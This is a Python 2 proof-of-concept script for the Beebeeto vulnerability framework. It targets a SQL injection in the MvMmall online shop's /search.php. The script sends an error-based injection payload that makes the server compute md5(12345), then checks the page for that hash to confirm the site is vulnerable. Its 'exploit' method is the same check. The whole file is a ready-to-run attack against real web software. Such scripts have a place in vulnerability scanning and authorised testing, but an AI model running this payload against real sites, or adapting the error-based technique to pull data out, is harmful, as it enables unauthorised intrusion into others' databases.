#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0056',
            'name': 'MvMmall 网店商城系统 /search.php SQL注入漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-03-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'MvMmall',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['MvMmall漏洞', 'SQL注入漏洞', '/search.php', 'php'],
            'desc': '''
                    mvmmall网店商城系统最新注入0day问题出在搜索search.php这个文件上。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2011-01732',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from"
                   "(select%20count(*),concat((select%20(select%20md5(12345))%20"
                   "from%20information_schema.tables%20limit%200,1),floor(rand(0)"
                   "*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20"
                   "and%201=1%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '827ccb0eea8a706c4c34a16891f84e7b' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())